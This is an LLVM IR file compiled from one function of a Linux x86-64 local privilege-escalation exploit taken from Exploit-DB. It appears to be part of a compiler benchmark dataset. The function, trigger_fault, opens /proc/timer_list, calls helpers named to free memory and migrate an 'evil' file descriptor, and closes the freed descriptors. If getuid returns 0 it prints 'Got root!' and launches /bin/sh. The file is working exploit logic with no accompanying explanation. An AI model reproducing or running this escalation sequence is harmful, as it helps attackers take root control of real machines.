; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_9083.c_trigger_fault.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_9083.c_trigger_fault.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@__const.trigger_fault.argv = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* null], align 16
@.str.1 = private unnamed_addr constant [17 x i8] c"/proc/timer_list\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@unsafe_fd = common dso_local global i32* null, align 8
@.str.2 = private unnamed_addr constant [16 x i8] c"[**] Got root!\0A\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"[**] Cannot open /proc/timer_list\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (void ()* @trigger_fault to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @trigger_fault() #0 {
  %1 = alloca [2 x i8*], align 16
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = bitcast [2 x i8*]* %1 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %4, i8* align 16 bitcast ([2 x i8*]* @__const.trigger_fault.argv to i8*), i64 16, i1 false)
  %5 = load i32, i32* @O_RDONLY, align 4
  %6 = call i32 @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0), i32 %5)
  store i32 %6, i32* %2, align 4
  %7 = load i32, i32* %2, align 4
  %8 = icmp sge i32 %7, 0
  br i1 %8, label %9, label %35

9:                                                ; preds = %0
  %10 = load i32, i32* %2, align 4
  %11 = call i32 @ioctl(i32 %10, i32 0, i32 0)
  %12 = call i32 (...) @__free_stuff()
  %13 = call i32 (...) @migrate_evil_fd()
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %24, %9
  %15 = load i32, i32* %3, align 4
  %16 = icmp slt i32 %15, 4
  br i1 %16, label %17, label %27

17:                                               ; preds = %14
  %18 = load i32*, i32** @unsafe_fd, align 8
  %19 = load i32, i32* %3, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i32, i32* %18, i64 %20
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @close(i32 %22)
  br label %24

24:                                               ; preds = %17
  %25 = load i32, i32* %3, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %3, align 4
  br label %14

27:                                               ; preds = %14
  %28 = call i32 (...) @getuid()
  %29 = icmp ne i32 %28, 0
  br i1 %29, label %34, label %30

30:                                               ; preds = %27
  %31 = call i32 @__msg(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  %32 = getelementptr inbounds [2 x i8*], [2 x i8*]* %1, i64 0, i64 0
  %33 = call i32 @execve(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8** %32, i32* null)
  br label %34

34:                                               ; preds = %30, %27
  br label %38

35:                                               ; preds = %0
  %36 = call i32 @__msg(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0))
  %37 = call i32 (...) @__free_stuff()
  br label %38

38:                                               ; preds = %35, %34
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i32 @ioctl(i32, i32, i32) #2

declare dso_local i32 @__free_stuff(...) #2

declare dso_local i32 @migrate_evil_fd(...) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @getuid(...) #2

declare dso_local i32 @__msg(i8*) #2

declare dso_local i32 @execve(i8*, i8**, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
